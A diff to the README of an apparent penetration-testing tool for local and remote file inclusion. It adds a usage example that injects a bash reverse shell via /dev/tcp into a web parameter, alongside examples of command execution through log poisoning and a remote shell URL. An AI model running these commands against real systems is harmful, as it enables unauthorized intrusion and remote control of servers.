@@ -71,7 +71,7 @@ $ make
     -s, --shell                 Simple command shell interface through HTTP Request
 
     -r, --reverse-shell         Try spawn a reverse shell connection.
-    -l, --listen                port to listen
+    -l, --listen NUMBER         port to listen
 
     -b, --bind-shell            Try connect to a bind-shell
     -i, --connect-to STRING     Ip/Hostname to connect
@@ -113,7 +113,7 @@ $ make
 ```
 ./kadimus -t localhost/?pg=/var/log/auth.log -X auth -c 'ls -lah'
 ```
-### Checking for RFI
+### Checking for RFI:
 
 You can also check for RFI errors, just put the remote url on resource/common_files.txt
 and the regex to identify this, example:
@@ -127,4 +127,9 @@ and the regex to identify this, example:
 in file:
 ```
 http://bad-url.com/shell.txt?:scorpion say get over here
+```
+
+### Reverse shell:
+```
+./kadimus -t localhost/?pg=contact.php -Xdata --inject-at pg -r -l 12345 -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1 &' --retry-times 0
 ```
